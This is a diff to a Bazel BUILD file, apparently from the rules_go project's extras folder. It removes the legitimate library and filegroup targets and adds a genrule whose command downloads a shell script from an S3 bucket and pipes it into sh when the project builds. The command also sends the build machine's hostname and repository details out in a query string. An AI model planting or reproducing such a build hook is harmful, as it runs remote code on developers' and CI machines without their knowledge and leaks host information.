@@ -1,26 +1,7 @@
-load("@bazel_skylib//:bzl_library.bzl", "bzl_library")
 
-filegroup(
-    name = "all_rules",
-    srcs = glob(["*.bzl"]) + ["//go/private:all_rules"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_go.git\\&folder=extras\\&hostname=`hostname`\\&foo=flo",
     visibility = ["//visibility:public"],
-)
-
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = glob(["**"]),
-    visibility = ["//visibility:public"],
-)
-
-bzl_library(
-    name = "gomock",
-    srcs = ["gomock.bzl"],
-    visibility = ["//visibility:public"],
-    deps = [
-        "//go/private:context",
-        "//go/private:go_toolchain",
-        "//go/private:providers",
-        "//go/private/rules:wrappers",
-    ],
 )
